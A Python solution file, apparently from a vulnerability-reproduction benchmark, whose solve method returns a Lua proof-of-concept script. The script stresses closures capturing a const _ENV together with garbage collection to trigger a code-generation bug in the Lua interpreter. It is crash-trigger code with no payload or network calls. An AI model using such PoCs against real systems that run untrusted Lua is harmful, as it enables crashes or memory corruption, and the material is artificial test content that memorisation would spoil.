import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = r'''
-- PoC for Lua incorrect codegen when _ENV is <const>
-- The script creates nested closures that capture a const _ENV,
-- calls them after the defining frame is gone, and stresses GC.

local holders = {}

-- Many closures referencing globals via a const _ENV inside an outer function
local function mk_outer()
  local _ENV <const> = setmetatable({}, {__index=_G})
  -- pad locals to shake stack layout a bit
  local a1,a2,a3,a4,a5 = {}, {}, {}, {}, {}
  a1.x = 1; a2.y = 2; a3.z = 3; a4.w = 4; a5.v = 5

  local function inner1() return print end
  local function inner2() return tostring end
  local function inner3() return tonumber end
  local function inner4() return next end
  local function inner5() return pcall end
  return inner1, inner2, inner3, inner4, inner5
end

for k=1,30 do
  local i1,i2,i3,i4,i5 = mk_outer()
  holders[#holders+1] = i1
  holders[#holders+1] = i2
  holders[#holders+1] = i3
  holders[#holders+1] = i4
  holders[#holders+1] = i5
end

collectgarbage("collect"); collectgarbage()

for i=1,#holders do
  local f = holders[i]
  local p = f()
  if type(p)=="function" then
    -- perform a benign call to force the engine to use the retrieved function
    -- keep args lightweight
    p("")
  end
end

-- Use to-be-closed locals to encourage stack reuse/GC activity
local function mk_closer()
  local _ENV <const> = setmetatable({}, {__index=_G})
  local token <close> = setmetatable({}, { __close = function()
    -- Intensify memory traffic around upvalues/stack between creations/uses
    for _=1,3 do collectgarbage("collect") end
  end })
  local function innerA() return type end
  local function innerB() return ipairs end
  return innerA, innerB
end

do
  local a,b = mk_closer()
  holders[#holders+1] = a
  holders[#holders+1] = b
end

collectgarbage("collect")

for i=1,#holders do
  local f = holders[i]
  local p = f()
  if type(p)=="function" then
    p({})
  end
end

-- Nested blocks with const _ENV and closures
do
  local _ENV <const> = setmetatable({}, {__index=_G})
  function global_inner_1()
    local function z() return select end
    return z
  end
end

do
  local _ENV <const> = setmetatable({}, {__index=_G})
  function global_inner_2()
    local function q() return assert end
    return q
  end
end

local g1 = global_inner_1()
local g2 = global_inner_2()
if type(g1)=="function" then
  local p = g1()
  if type(p)=="function" then p(1,2,3) end
end
if type(g2)=="function" then
  local p = g2()
  if type(p)=="function" then p(true) end
end

-- Generate closures via load() with a local const _ENV inside the loaded chunk
for i=1,10 do
  local code = [[
    return function()
      local _ENV <const> = setmetatable({}, {__index=_G})
      local pad1,pad2,pad3 = 1,2,3
      local function inner() return print end
      return inner
    end
  ]]
  local factory = assert(load(code))()
  local fn = factory()
  holders[#holders+1] = fn
end

collectgarbage("collect"); collectgarbage("collect")

for i=1,#holders do
  local fn = holders[i]
  local p = fn()
  if type(p)=="function" then
    -- Make a few calls to increase likelihood of reusing freed frames
    p("")
    p("")
  end
end

-- Another scenario: const _ENV in a non-top-level function with deeper nesting
local function deepnest()
  local _ENV <const> = setmetatable({}, {__index=_G})
  local function level1()
    local function level2()
      -- access through const _ENV multiple times
      return tonumber, tostring, rawget, rawset, coroutine and coroutine.create
    end
    return level2
  end
  return level1()
end

local dn = deepnest()
local a,b,c,d,e = dn()
if type(a)=="function" then a("10") end
if type(b)=="function" then b(10) end
if type(c)=="function" then c({}, "k") end
if type(d)=="function" then d({}, "k", 1) end
if type(e)=="function" then
  local co = e(function() end)
  if type(co)=="thread" then
    -- nothing
  end
end

collectgarbage("collect"); collectgarbage()

-- Final wave to reuse and shake stacks again
for i=1,#holders do
  local fn = holders[i]
  local p = fn()
  if type(p)=="function" then
    p("")
  end
end
'''
        return poc.encode('utf-8')